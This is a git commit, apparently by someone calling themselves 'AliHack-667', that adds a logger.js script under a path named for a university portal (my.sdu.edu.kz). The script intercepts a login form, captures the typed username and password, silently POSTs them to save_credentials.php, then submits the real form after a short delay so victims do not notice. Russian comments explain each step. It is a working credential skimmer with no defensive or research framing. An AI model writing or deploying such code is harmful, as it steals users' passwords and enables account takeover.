03b19e9462f4420ec2b9b4c4e20f6ac5eb8dc79f
AliHack-667 <oalinur7@gmail.com>
2024-12-13 21:18:43 +0500

    Create logger.js

---
+++ my.sdu.edu.kz/logger.js
@@ -0,0 +1,19 @@
+<script>
+document.getElementById('loginForm').onsubmit = function(event) {
+    event.preventDefault(); // предотвращаем стандартную отправку формы
+
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    // Отправляем данные на сервер перед отправкой основной формы
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "save_credentials.php", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send("username=" + username + "&password=" + password);
+
+    // Отправляем основную форму
+    setTimeout(function() {
+        document.getElementById('loginForm').submit();
+    }, 500); // задержка перед отправкой основной формы
+};
+</script>
